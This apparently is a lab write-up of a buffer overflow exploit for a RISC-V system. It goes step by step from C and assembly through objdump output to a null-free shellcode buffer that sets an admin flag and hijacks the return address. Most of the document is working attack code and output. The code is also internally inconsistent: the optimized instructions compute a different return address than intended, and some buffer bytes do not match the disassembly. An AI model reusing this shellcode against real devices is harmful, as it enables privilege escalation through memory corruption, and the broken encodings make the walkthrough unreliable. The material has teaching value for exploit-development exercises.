# Buffer Overflow Attack: Creating and Optimizing the Buffer

## Step 1: Initial C Code for the Attack

We start with the initial C code for the attack, saved in `attack_draft.c`:

```c
#define adminMode *(char *)0x4080d4e8
register unsigned int ra __asm__("ra");

void main()
{
    adminMode = 1;
    ra = 0x4200b788;
}
```

---

## Step 2: Generating Assembly Code

We compile the C code using a RISC-V compiler (e.g., cpulator) to generate the assembly code for the `main` function. The resulting assembly code is saved in `attack_draft.S`:

```assembly
.global _start
_start:
    lui     a5, 0x4080d       # load upper bits of adminMode address
    li      a4, 1             # load 1 into a4
    sb      a4, 0x4e8(a5)     # set adminMode to 1
    lui     ra, 0x4200b       # load upper bits of return address
    addi    ra, ra, 0x788     # add lower bits of return address
    ret                       # return
```

---

## Step 3: Compiling and Analyzing the Object File

We compile the assembly code into an object file using the `-march=rv32i` flag:

```bash
riscv32-esp-elf-as -march=rv32i attack_draft.S -o attack_draft.o
```

### What is `-march=rv32i`?

The `-march=rv32i` flag specifies that the code should be compiled for the RISC-V 32-bit architecture with the "I" (Integer) base instruction set. This is the simplest and most basic RISC-V instruction set, which does not include extensions like compressed instructions (RVC). We use `rv32i` here because the initial assembly code does not rely on any advanced features or extensions.

---

We then analyze the object file using `objdump`:

```bash
riscv32-esp-elf-objdump -d attack_draft.o
```

Output:

```plaintext
00000000 <_start>:
   0:   4080d7b7                lui     a5,0x4080d
   4:   00100713                li      a4,1
   8:   4ee78423                sb      a4,1256(a5) # 4080d4e8 <_start+0x4080d4e8>
   c:   4200b0b7                lui     ra,0x4200b
  10:   78808093                addi    ra,ra,1928 # 4200b788 <_start+0x4200b788>
  14:   00008067                ret
```

We notice that the machine code contains `0x00` bytes, which can cause issues during the attack.

---

## Step 4: Optimizing the Assembly Code

To avoid `0x00` bytes, we modify the assembly code and save it as `attack_optimized.S`:

```assembly
.global _start
_start:
    lui     a5, 0x4080d       # load upper bits of adminMode address
    c.li    a4, 1             # load 1 into a4
    .option norvc             # disable compressed instructions
    sb      a4, 0x4e8(a5)     # set adminMode to 1
    sub     ra, ra, ra        # clear ra
    addi    ra, ra, 0x42      # add 0x42 to ra
    slli    ra, ra, 24        # shift ra left by 24 bits
    lui     t3, 0xb6e00       # load upper bits of return address
    srli    t3, t3, 16        # shift t3 right by 16 bits
    add     ra, ra, t3        # add t3 to ra
    .option rvc               # enable compressed instructions
    c.jr    ra                # jump to ra
```

---

## Step 5: Compiling and Verifying the Optimized Code

We compile the optimized assembly code using the `-march=rv32imc` flag:

```bash
riscv32-esp-elf-as -march=rv32imc attack_optimized.S -o attack_optimized.o
```

### What is `-march=rv32imc`?

The `-march=rv32imc` flag specifies that the code should be compiled for the RISC-V 32-bit architecture with the "I" (Integer) base instruction set, the "M" (Multiplication and Division) extension, and the "C" (Compressed) extension. The compressed extension (RVC) allows for shorter 16-bit instructions, which are useful for avoiding `0x00` bytes in the machine code. We use `rv32imc` here because the optimized assembly code relies on compressed instructions like `c.li` and `c.jr`.

---

We then analyze the object file using `objdump`:

```bash
riscv32-esp-elf-objdump -d attack_optimized.o
```

Output:

```plaintext
00000000 <_start>:
   0:   4080d7b7                lui     a5,0x4080d
   4:   4705                    li      a4,1
   6:   4ee78423                sb      a4,1256(a5) # 4080d4e8 <_start+0x4080d4e8>
   a:   401080b3                sub     ra,ra,ra
   e:   04208093                addi    ra,ra,66
  12:   01809093                slli    ra,ra,0x18
  16:   b6e00e37                lui     t3,0xb6e00
  1a:   010e5e13                srli    t3,t3,0x10
  1e:   01c080b3                add     ra,ra,t3
  22:   8082                    ret
```

The optimized code contains no `0x00` bytes, making it suitable for the attack.

---

## Step 6: Converting Machine Code to a Buffer

We convert the machine code into a C buffer for use in the attack:

```c
char buffer[80] = {
    0xb7, 0xd7, 0x80, 0x40, // load adminMode address
    0x05, 0x47,             // load 1 into a4
    0x23, 0x84, 0xe7, 0x4e, // set adminMode to 1
    0xb3, 0x80, 0x10, 0x40, // clear ra
    0x93, 0x80, 0x20, 0x04, // add 0x42 to ra
    0x93, 0x90, 0x80, 0x01, // shift ra left
    0x37, 0x0e, 0x88, 0xb7, // load return address
    0x13, 0x5e, 0x0e, 0x01, // shift t3 right
    0xb3, 0x80, 0xc0, 0x01, // add t3 to ra
    0x82, 0x80,             // jump to ra
    0x01, 0x01, 0x01, 0x01, // padding
    0x01, 0x01, 0x01, 0x01, // padding
    0x01, 0x01, 0x01, 0x01, // padding
    0x01, 0x01, 0x01, 0x01, // padding
    0x01, 0x01, 0x01, 0x01, // padding
    0x01, 0x01, 0x01, 0x01, // padding
    0x70, 0x04, 0x81, 0x40, // overwrite return address
    0x00                    // null terminator
};
```

---

## Conclusion

1. We started with a C code snippet to enable admin mode.
2. Generated assembly code and optimized it to remove `0x00` bytes.
3. Used `-march=rv32i` for the initial assembly code and `-march=rv32imc` for the optimized code to leverage compressed instructions.
4. Converted the machine code into a buffer for use in the attack.
5. The final buffer can be used to exploit the vulnerable function and achieve the desired behavior.
